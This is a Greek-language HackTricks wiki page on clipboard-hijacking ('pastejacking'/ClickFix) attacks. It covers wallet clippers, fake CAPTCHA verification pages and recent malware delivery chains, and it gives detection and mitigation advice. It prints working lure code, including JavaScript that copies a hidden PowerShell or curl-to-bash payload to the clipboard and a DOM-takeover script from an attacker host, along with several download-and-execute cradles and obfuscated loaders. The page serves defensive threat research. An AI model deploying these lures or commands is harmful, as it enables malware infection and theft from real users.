# Επιθέσεις Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> «Μην κάνεις ποτέ paste κάτι που δεν αντέγραψες ο ίδιος.» – παλιά αλλά ακόμη έγκυρη συμβουλή

## Επισκόπηση

Το Clipboard hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες κάνουν συχνά copy-and-paste εντολές χωρίς να τις ελέγχουν. Μια κακόβουλη ιστοσελίδα (ή οποιοδήποτε context με δυνατότητα JavaScript, όπως μια εφαρμογή Electron ή Desktop) τοποθετεί προγραμματιστικά κείμενο ελεγχόμενο από τον attacker στο system clipboard. Τα θύματα ενθαρρύνονται, συνήθως μέσω προσεκτικά διαμορφωμένων οδηγιών social-engineering, να πατήσουν **Win + R** (διάλογος Run), **Win + X** (Quick Access / PowerShell) ή να ανοίξουν ένα terminal και να κάνουν *paste* το περιεχόμενο του clipboard, εκτελώντας άμεσα arbitrary commands.

Επειδή **δεν γίνεται download κάποιου αρχείου και δεν ανοίγει κάποιο attachment**, η τεχνική παρακάμπτει τα περισσότερα e-mail και web-content security controls που παρακολουθούν attachments, macros ή direct command execution. Για αυτόν τον λόγο, η επίθεση είναι δημοφιλής σε phishing campaigns που παραδίδουν commodity malware families όπως τα NetSupport RAT, Latrodectus loader ή Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers αντικατάστασης wallet addresses

Μια άλλη παραλλαγή του **clipboard hijacking** δεν κάνει paste καθόλου commands: περιμένει μέχρι το θύμα να αντιγράψει μια **cryptocurrency wallet address** και, στη συνέχεια, την αντικαθιστά αθόρυβα με μια address που ελέγχεται από τον attacker ακριβώς πριν από το paste. Αυτό είναι ιδιαίτερα αποτελεσματικό σε μεγάλα wallet formats, επειδή οι χρήστες συχνά επαληθεύουν μόνο τους πρώτους/τελευταίους χαρακτήρες.<sup>[[8]](#references)</sup>

Συνηθισμένα χαρακτηριστικά από πραγματικές επιθέσεις:
- **Thin loader + nested payload**: η εμφανής εφαρμογή/exe μοιάζει με νόμιμο trading ή "profit" tool, ενώ το πραγματικό clipper είναι κρυμμένο βαθύτερα μέσα στο bundle (για παράδειγμα, ένας .NET loader που εκκινεί ένα nested Rust payload).
- **Regex-driven replacement**: το malware εντοπίζει strings όπως `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ή ακόμη και generic **44-character Solana-like** strings και τα αντικαθιστά με attacker wallets.
- **Wallet rotation at scale**: σύγχρονα Windows samples μπορεί να περιέχουν **χιλιάδες** replacement wallets ανά currency αντί για μία single static address, μειώνοντας το wallet reputation burn μετά από κάθε κλοπή.<sup>[[8]](#references)</sup>

### Windows clipper flow

Μια συνηθισμένη υλοποίηση είναι ένα hidden window που έχει καταχωριστεί με το **`AddClipboardFormatListener`**. Σε κάθε clipboard update, το malware συνήθως καλεί:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → πρόσβαση στα τρέχοντα clipboard data.
- **`GetClipboardData`** → ανάγνωση του text.
- **`EmptyClipboard`** + **`SetClipboardData`** → αντικατάσταση του wallet string με την attacker value.

Minimal hunting regexes που εμφανίζονται συχνά σε clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Η persistence σε επίπεδο χρήστη είναι αρκετή για impact. Ένα μοτίβο που έχει παρατηρηθεί είναι:<sup>[[8]](#references)</sup>
- Αντιγραφή του payload στο **`%APPDATA%\silke\silke.exe`**
- Δημιουργία ενός **Startup-folder LNK** στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ιδέες για detection:
- Processes που καλούν συνεχώς clipboard APIs και ταυτόχρονα γράφουν κάτω από το `%APPDATA%` και τον φάκελο **Startup** του χρήστη.
- Δημιουργία νέου LNK/executable, ακολουθούμενη από rewrites του clipboard με wallet addresses.
- Archives ή fake-software bundles που περιέχουν πολλά αχρησιμοποίητα αρχεία και έναν μικρό launcher που εκκινεί ένα nested binary.

### Αφαίρεση quarantine μέσω social engineering στο macOS και persistence με LaunchAgent

Στο macOS, ορισμένες campaigns διανέμουν ένα **`unlocker.command`** helper και instruρούν το θύμα να κάνει right-click → **Άνοιγμα**, αν το Gatekeeper αναφέρει ότι η εφαρμογή είναι κατεστραμμένη ή προέρχεται από unidentified developer. Το script απλώς αφαιρεί το quarantine και εκκινεί το κοντινό `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Αυτό **δεν** είναι exploit του **Gatekeeper**· είναι μια **παράκαμψη quarantine μέσω social engineering** που εκμεταλλεύεται το γεγονός ότι οι αποφάσεις του Gatekeeper εξαρτώνται από το `com.apple.quarantine` xattr.<sup>[[8]](#references)</sup>

Μετά την εκτέλεση, το clipper μπορεί να παραμείνει persistent ως ο τρέχων χρήστης γράφοντας:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent με `RunAtLoad` και `KeepAlive`

Μια χρήσιμη αμυντική λεπτομέρεια είναι ότι ορισμένα samples υλοποιούν έναν **self-healing watchdog** που ξαναγράφει το LaunchAgent και το wrapper κάθε ~30 δευτερόλεπτα. Αν αφαιρέσετε πρώτα το plist **χωρίς να τερματίσετε τη running process**, το malware μπορεί να το δημιουργήσει ξανά αμέσως.<sup>[[8]](#references)</sup> Ασφαλής σειρά cleanup:
1. Τερματίστε τη running clipper process.
2. Κάντε unload/delete το LaunchAgent plist.
3. Διαγράψτε τα `~/launch.sh` και το copied payload.

### Σημείωση διανομής: ψεύτικη φήμη ως force multiplier

Σε αυτή την οικογένεια, το ίδιο το malware μπορεί να παραμένει τεχνικά απλό, ενώ το **distribution layer** αναλαμβάνει το μεγαλύτερο βάρος: fake GitHub stars/forks, reviews/downloads στο SourceForge, comments/views σε YouTube tutorials και benign-looking comments/votes στο VirusTotal χρησιμοποιούνται ώστε το binary να φαίνεται αξιόπιστο πριν από την εκτέλεση.<sup>[[8]](#references)</sup>

## Υποχρεωτικά κουμπιά αντιγραφής και κρυφά payloads (macOS one-liners)

Ορισμένα macOS infostealers κλωνοποιούν installer sites (π.χ. το Homebrew) και **επιβάλλουν τη χρήση ενός κουμπιού “Copy”**, ώστε οι χρήστες να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η καταχώριση στο clipboard περιέχει την αναμενόμενη installer command μαζί με ένα προσαρτημένο Base64 payload (π.χ. `...; echo <b64> | base64 -d | sh`), επομένως ένα μόνο paste εκτελεί και τα δύο, ενώ το UI αποκρύπτει το επιπλέον stage.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Παλαιότερες campaigns χρησιμοποιούσαν το `document.execCommand('copy')`, ενώ οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## The ClickFix / ClearFake Flow

1. Ο χρήστης επισκέπτεται έναν typosquatted ή compromised ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Η injected **ClearFake** JavaScript καλεί έναν `unsecuredCopyToClipboard()` helper, ο οποίος αποθηκεύει αθόρυβα ένα Base64-encoded PowerShell one-liner στο clipboard.
3. Οι οδηγίες HTML λένε στο θύμα: *«Πατήστε **Win + R**, κάντε paste την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. Το `powershell.exe` εκτελείται και κατεβάζει ένα archive που περιέχει ένα legitimate executable μαζί με ένα malicious DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον stages, κάνει inject shellcode και εγκαθιστά persistence (π.χ. scheduled task) – εκτελώντας τελικά NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Παράδειγμα Chain του NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* Το `jp2launcher.exe` (νόμιμο Java WebStart) αναζητά στον κατάλογό του το `msvcp140.dll`.
* Το κακόβουλο DLL επιλύει δυναμικά τα APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω του **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα rolling XOR key `"https://google.com/"`, κάνει inject το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει το `la.txt` με το **curl.exe**
2. Εκτελεί το JScript downloader μέσα στο **cscript.exe**
3. Λαμβάνει ένα MSI payload → αποθέτει το `libcef.dll` δίπλα σε μια υπογεγραμμένη εφαρμογή → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση **mshta** εκκινεί ένα κρυφό script PowerShell που ανακτά το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανακατασκευάζει το `AutoIt3.exe` μέσω των `extrac32` και της συνένωσης αρχείων και, τέλος, εκτελεί ένα script `.a3x` που κάνει exfiltration των credentials του browser προς το `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες καμπάνιες ClickFix παραλείπουν εντελώς τις λήψεις αρχείων και instruct τα θύματα να κάνουν paste μια one-liner που ανακτά και εκτελεί JavaScript μέσω WSH, το κάνει persist και περιστρέφει το C2 καθημερινά. Παρακάτω παρουσιάζεται μια παρατηρημένη αλυσίδα:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Βασικά χαρακτηριστικά
- Το obfuscated URL αντιστρέφεται κατά την εκτέλεση για να αποτρέψει την επιφανειακή επιθεώρηση.
- Το JavaScript διατηρείται μέσω ενός Startup LNK (WScript/CScript) και επιλέγει το C2 με βάση την τρέχουσα ημέρα, επιτρέποντας την ταχεία rotation των domains.<sup>[[3]](#references)</sup>

Ελάχιστο απόσπασμα JS που χρησιμοποιείται για την rotation των C2s ανά ημερομηνία:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιστά persistence και κατεβάζει ένα RAT (π.χ., PureHVNC), συχνά με TLS pinning σε ένα hardcoded certificate και τεμαχισμό της κίνησης.<sup>[[3]](#references)</sup>

Ιδέες ανίχνευσης ειδικά για αυτή την παραλλαγή
- Δέντρο διεργασιών: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ή `cscript.exe`).
- Artifacts εκκίνησης: LNK στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που καλεί το WScript/CScript με διαδρομή JS κάτω από `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και telemetry γραμμής εντολών που περιέχουν `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενα `powershell -NoProfile -NonInteractive -Command -` με μεγάλα payloads στο stdin για την τροφοδότηση μεγάλων scripts χωρίς μεγάλες γραμμές εντολών.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins, όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, κάτω από task/path που μοιάζει με updater (π.χ., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostnames και URLs που αλλάζουν καθημερινά και ακολουθούν το μοτίβο `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχετίστε συμβάντα εγγραφής στο clipboard που ακολουθούνται από επικόλληση με Win+R και άμεση εκτέλεση του `powershell.exe`.

Οι Blue teams μπορούν να συνδυάσουν telemetry από το clipboard, τη δημιουργία διεργασιών και το registry για να εντοπίσουν την κατάχρηση pastejacking:

* Μητρώο Windows: Το `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` διατηρεί ιστορικό εντολών **Win + R** – αναζητήστε ασυνήθιστες καταχωρίσεις Base64 / obfuscated.
* Security Event ID **4688** (Process Creation), όπου το `ParentImage` == `explorer.exe` και το `NewProcessName` ανήκει στο { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργίες αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή προσωρινούς φακέλους, ακριβώς πριν από το ύποπτο event 4688.
* EDR clipboard sensors (εφόσον υπάρχουν) – συσχετίστε το `Clipboard Write` που ακολουθείται αμέσως από μια νέα διεργασία PowerShell.

## Σελίδες επαλήθευσης τύπου IUAM (ClickFix Generator): αντιγραφή από το clipboard στην κονσόλα + payloads με επίγνωση του OS

Πρόσφατες campaigns παράγουν μαζικά ψεύτικες σελίδες επαλήθευσης CDN/φυλλομετρητή ("Just a moment…", τύπου IUAM), οι οποίες εξαναγκάζουν τους χρήστες να αντιγράφουν OS-specific εντολές από το clipboard σε native consoles. Αυτό μεταφέρει την εκτέλεση εκτός του browser sandbox και λειτουργεί σε Windows και macOS.<sup>[[4]](#references)</sup>

Βασικά χαρακτηριστικά των σελίδων που δημιουργούνται από τον builder
- Ανίχνευση OS μέσω `navigator.userAgent` για την προσαρμογή των payloads (Windows PowerShell/CMD έναντι macOS Terminal). Προαιρετικά decoys/no-ops για μη υποστηριζόμενα OS, ώστε να διατηρείται η ψευδαίσθηση.
- Αυτόματη αντιγραφή στο clipboard κατά τη διάρκεια αθώων ενεργειών UI (checkbox/Copy), ενώ το ορατό κείμενο μπορεί να διαφέρει από το περιεχόμενο του clipboard.
- Αποκλεισμός mobile συσκευών και ένα popover με οδηγίες βήμα προς βήμα: Windows → Win+R→paste→Enter· macOS → άνοιγμα Terminal→paste→Enter.
- Προαιρετικό obfuscation και single-file injector για την αντικατάσταση του DOM ενός compromised site με verification UI βασισμένο σε Tailwind (δεν απαιτείται νέα καταχώριση domain).<sup>[[4]](#references)</sup>

Παράδειγμα: mismatch στο clipboard + branching με επίγνωση του OS
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Επιμονή της αρχικής εκτέλεσης στο macOS
- Χρησιμοποιήστε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, ώστε η εκτέλεση να συνεχίζεται μετά το κλείσιμο του terminal, μειώνοντας τα ορατά ίχνη.<sup>[[4]](#references)</sup>

Ανάληψη σελίδας επιτόπου σε compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες για detection & hunting ειδικά για lures τύπου IUAM
- Web: Σελίδες που συνδέουν το Clipboard API με verification widgets· ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του clipboard payload· branching μέσω `navigator.userAgent`· Tailwind + αντικατάσταση single-page σε ύποπτα contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από interaction στον browser· batch/MSI installers που εκτελούνται από το `%TEMP%`.
- macOS endpoint: Το Terminal/iTerm κάνει spawn των `bash`/`curl`/`base64 -d` με `nohup` κοντά σε browser events· background jobs που συνεχίζουν μετά το κλείσιμο του terminal.
- Συσχετίστε το ιστορικό `RunMRU` του Win+R και τα clipboard writes με τη subsequent δημιουργία console processes.

Δείτε επίσης για supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Εξελίξεις fake CAPTCHA / ClickFix το 2026 (ClearFake, Scarlet Goldfinch)

- Το ClearFake συνεχίζει να παραβιάζει WordPress sites και να εισάγει loader JavaScript που αλυσιδώνει external hosts (Cloudflare Workers, GitHub/jsDelivr), ακόμη και blockchain “etherhiding” calls (π.χ. POSTs σε Binance Smart Chain API endpoints όπως το `bsc-testnet.drpc[.]org`), για να ανακτήσει την τρέχουσα lure logic. Τα πρόσφατα overlays χρησιμοποιούν σε μεγάλο βαθμό fake CAPTCHAs που καθοδηγούν τους χρήστες να κάνουν copy/paste ένα one-liner (T1204.004), αντί να κατεβάσουν οτιδήποτε.<sup>[[6]](#references)</sup>
- Η initial execution ανατίθεται όλο και περισσότερο σε signed script hosts/LOLBAS. Οι αλυσίδες του Ιανουαρίου 2026 αντικατέστησαν την προηγούμενη χρήση του `mshta` με το ενσωματωμένο `SyncAppvPublishingServer.vbs`, το οποίο εκτελείται μέσω `WScript.exe` και λαμβάνει PowerShell-like arguments με aliases/wildcards για την ανάκτηση remote content:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- Το `SyncAppvPublishingServer.vbs` είναι υπογεγραμμένο και χρησιμοποιείται κανονικά από το App-V· σε συνδυασμό με το `WScript.exe` και ασυνήθιστα ορίσματα (ψευδώνυμα `gal`/`gcm`, cmdlets με wildcard, URLs του jsDelivr) μετατρέπεται σε στάδιο LOLBAS υψηλής αξιοπιστίας για το ClearFake.<sup>[[6]](#references)</sup>
- Τα payloads ψεύτικων CAPTCHA του Φεβρουαρίου 2026 μετατοπίστηκαν ξανά σε αμιγώς PowerShell download cradles. Δύο ενεργά παραδείγματα:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Η πρώτη αλυσίδα είναι ένας in-memory `iex(irm ...)` grabber· η δεύτερη χρησιμοποιεί staging μέσω `WinHttp.WinHttpRequest.5.1`, γράφει ένα προσωρινό `.ps1` και στη συνέχεια το εκκινεί με `-ep bypass` σε κρυφό παράθυρο.<sup>[[6]](#references)</sup>

Συμβουλές ανίχνευσης/hunting για αυτές τις παραλλαγές
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ή PowerShell cradles αμέσως μετά από εγγραφές στο clipboard/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domains του jsDelivr/GitHub/Cloudflare Worker ή μοτίβα raw IP `iex(irm ...)`.
- Network: outbound συνδέσεις προς CDN worker hosts ή blockchain RPC endpoints από script hosts/PowerShell λίγο μετά την περιήγηση στον ιστό.
- File/registry: δημιουργία προσωρινών `.ps1` στο `%TEMP%` και RunMRU entries που περιέχουν αυτά τα one-liners· block/alert σε signed-script LOLBAS (WScript/cscript/mshta) που εκτελούνται με external URLs ή obfuscated alias strings.

## Tradecraft του ClickFix τον Ιούνιο του 2026: paste telemetry, ψεύτικα σχόλια επαλήθευσης και LOLBin chaining

Πρόσφατο Red Canary telemetry δείχνει ότι ο σταθερός δείκτης δεν είναι **μία συγκεκριμένη εντολή**, αλλά ο συνδυασμός **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** και **immediate execution**.<sup>[[7]](#references)</sup>

### Αξιοσημείωτα operator patterns

- **Paste confirmation telemetry**: ορισμένα payloads καλούν `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` πριν από το πραγματικό stage. Αυτό επιβεβαιώνει την αλληλεπίδραση του χρήστη, διατηρώντας παράλληλα το παράθυρο σύντομο και αθόρυβο.
- **Fake verification comments**: PowerShell one-liners ενδέχεται να προσθέτουν strings όπως `# Security check ✔️ I'm not a robot Verification ID: 138105`, ώστε η εντολή να εξακολουθεί να μοιάζει σχετική με CAPTCHA αφού επικολληθεί στο Run / `cmd.exe` / στο PowerShell history.
- **Dynamic URL reconstruction**: το `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` αποφεύγει ένα static URL στη command line, ενώ εξακολουθεί να εκτελεί in-memory download-and-execute.
- **Masqueraded installer execution**: το `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` καταχράται unusual casing και Unicode-like characters στα flags, ώστε να παρακάμπτει brittle detections, ενώ εξακολουθεί να μοιάζει με `msiexec.exe`.
- **Caret-escaped LOLBin chains**: το `cmd.exe` μπορεί να αποκρύπτει keywords με `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), να εκκινεί το nested shell σε minimized κατάσταση, να αποθηκεύει attacker content με benign extension όπως `.pdf` και στη συνέχεια να το εκτελεί μέσω `mshta`.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – απενεργοποιήστε την clipboard write-access (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε user gesture.
2. Security awareness – εκπαιδεύστε τους χρήστες να *πληκτρολογούν* ευαίσθητες εντολές ή να τις επικολλούν πρώτα σε text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για τον αποκλεισμό arbitrary one-liners.
4. Network controls – αποκλείστε outbound requests προς γνωστά pastejacking και malware C2 domains.

## Σχετικά Tricks

* Το **Discord Invite Hijacking** συχνά καταχράται την ίδια προσέγγιση ClickFix, αφού προσελκύσει τους χρήστες σε malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Διόρθωση του Click: Πρόληψη του ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Έρευνα Check Point – Under the Pure Curtain: Από RAT σε Builder και Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Το ClickFix Factory: Πρώτη αποκάλυψη του IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, η χρονιά του Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Φεβρουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Ιούνιος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Έρευνα Check Point – Από Stars σε Upvotes: Fake Reputation που τροφοδοτεί έναν Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
